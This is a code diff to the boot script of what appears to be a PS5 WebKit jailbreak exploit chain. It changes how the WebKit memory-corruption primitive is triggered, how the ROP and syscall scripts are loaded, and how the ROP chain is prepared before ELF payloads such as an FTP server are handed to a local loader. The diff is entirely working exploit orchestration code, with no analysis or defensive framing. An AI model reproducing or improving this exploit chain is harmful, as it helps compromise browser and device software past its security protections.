@@ -5,8 +5,7 @@ import { int64 } from "./int64.js";
 const Q = new URLSearchParams(location.search);
 const ARMED = Q.get("go") === "1";
 const BUILD = () => window.P2JB_BUILD || "dev";
-const MAX_ATTEMPTS = Math.max(1, Math.min(48,
-    parseInt(Q.get("attempts") || "12", 10)));
+const MAX_ATTEMPTS = 1;
 
 const PAYLOADS = [
     { name: "ftpsrv-ps5.elf", label: "FTP Server" },
@@ -46,6 +45,46 @@ function logLine(text) {
     logEl.scrollTop = logEl.scrollHeight;
 }
 
+async function settleBeforePrepare() {
+    if (typeof globalThis.gc === "function") {
+        try { globalThis.gc(); globalThis.gc(); globalThis.gc(); } catch (e) { }
+    }
+    await new Promise(r => setTimeout(r, 2000));
+    if (typeof globalThis.gc === "function") {
+        try { globalThis.gc(); } catch (e) { }
+    }
+}
+
+function loadScript(src) {
+    return new Promise((resolve, reject) => {
+        const s = document.createElement("script");
+        s.src = src;
+        s.onload = () => resolve();
+        s.onerror = () => reject(new Error("script load failed: " + src));
+        document.head.appendChild(s);
+    });
+}
+
+function waitOffsetsReady() {
+    return new Promise((resolve, reject) => {
+        const s = document.querySelector('script[src^="../offsets/"]');
+        if (!s) return reject(new Error("offsets script missing"));
+        if (typeof OFFSET_wk_vtable_first_element !== "undefined") return resolve(s.src);
+        s.addEventListener("load", () => resolve(s.src));
+        s.addEventListener("error", () => reject(new Error("offsets 404: " + s.src)));
+    });
+}
+
+async function loadChainScripts() {
+    const B = encodeURIComponent(BUILD());
+    logLine("loading chain scripts after WebKit purge");
+    await loadScript("rop.js?b=" + B);
+    await loadScript("main.js?b=" + B);
+    window.offsetsReady = waitOffsetsReady();
+    await loadScript("syscalls.js?b=" + B);
+    await window.offsetsReady;
+}
+
 async function preflight() {
     if (typeof prepare !== "function")
         throw new Error("main.js did not evaluate");
@@ -53,37 +92,7 @@ async function preflight() {
         throw new Error("rop.js did not evaluate");
     if (typeof SYS_GETPID === "undefined")
         throw new Error("syscalls.js did not evaluate");
-
-    await window.offsetsReady;
-    logLine("offsets ready fw=" + window.fw_str);
-
-    let verdict = "ok";
-    try {
-        const r = await fetch("rop_slave.js", { cache: "no-store" });
-        if (!r.ok) verdict = "http-" + r.status;
-    } catch (err) { verdict = "fetch-threw"; }
-    if (verdict === "ok") {
-        let w = null;
-        verdict = await new Promise(resolve => {
-            let done = false;
-            const finish = v => {
-                if (done) return;
-                done = true;
-                try { if (w) w.terminate(); } catch { }
-                resolve(v);
-            };
-            const t = setTimeout(() => finish("timeout"), 4000);
-            try {
-                w = new Worker("rop_slave.js");
-                w.onmessage = () => { clearTimeout(t); finish("ok"); };
-                w.onerror = () => { clearTimeout(t); finish("worker-error"); };
-                w.postMessage(0);
-            } catch (err) { clearTimeout(t); finish("worker-threw"); }
-        });
-    }
-    logLine("worker probe: " + verdict);
-    if (verdict !== "ok")
-        throw new Error("rop_slave.js not usable (" + verdict + ")");
+    logLine("offsets fw=" + window.fw_str);
 }
 
 function assertInt64Identity() {
@@ -97,7 +106,7 @@ async function bootWebKit() {
         return;
     }
 
-    stage("WebKit exploit — starting");
+    stage("WebKit (1 attempt)");
     try { history.replaceState(null, ""); } catch (e) { }
     if (typeof globalThis.gc === "function") {
         try { globalThis.gc(); } catch (e) { }
@@ -108,23 +117,26 @@ async function bootWebKit() {
         maxAttempts: MAX_ATTEMPTS,
         onEvent(tag, detail, attempt) {
             if (tag === "ATTEMPT-START")
-                stage("WebKit exploit — attempt " + attempt + "…");
+                stage("WebKit attempt " + attempt + "…");
         }
     });
 
     nogcHard.carrier = carrier;
     installWindowP(carrier, { onEvent() { } });
     nogcHard.carrier = null;
-    if (typeof globalThis.gc === "function") {
-        try { globalThis.gc(); } catch (e) { }
-    }
-    // slopkit poops.html: idle turn before prepare()'s worker ROP stack
-    await new Promise(r => setTimeout(r, 1000));
 
     if (!pairStatus.promoted)
         throw new Error("pair not promoted: " + pairStatus.error);
+    if (!fakeCellReleased())
+        throw new Error("exploit graph not released before prepare");
+
     logLine("primitive up released=" + fakeCellReleased()
         + " history=" + (history.state === null));
+
+    if (typeof globalThis.gc === "function") {
+        try { globalThis.gc(); } catch (e) { }
+    }
+    await new Promise(r => setTimeout(r, 1000));
 }
 
 async function bootPrepare() {
@@ -134,9 +146,15 @@ async function bootPrepare() {
     nogcHard.p = p;
     assertInt64Identity();
 
+    await settleBeforePrepare();
+
     stage("prepare()");
     logLine("prepare() enter");
-    const prepared = await prepare(p);
+    const prepared = await prepare(p, {
+        menu: true,
+        stackSize: 0x40000,
+        reservedStack: 0x8000
+    });
     P = prepared.p;
     chain = prepared.chain;
     nogcHard.chain = chain;
@@ -307,12 +325,12 @@ async function main() {
         return;
     }
 
-    document.getElementById("buildTag").textContent = "Build " + BUILD() + " (slopkit boot)";
+    document.getElementById("buildTag").textContent = "Build " + BUILD() + " (menu)";
     logLine("menu boot build=" + BUILD());
 
-    stage("preflight");
-    await preflight();
     await bootWebKit();
+    await loadChainScripts();
+    await preflight();
     await bootPrepare();
 
     stage("Checking elfldr on 127.0.0.1:9021…");
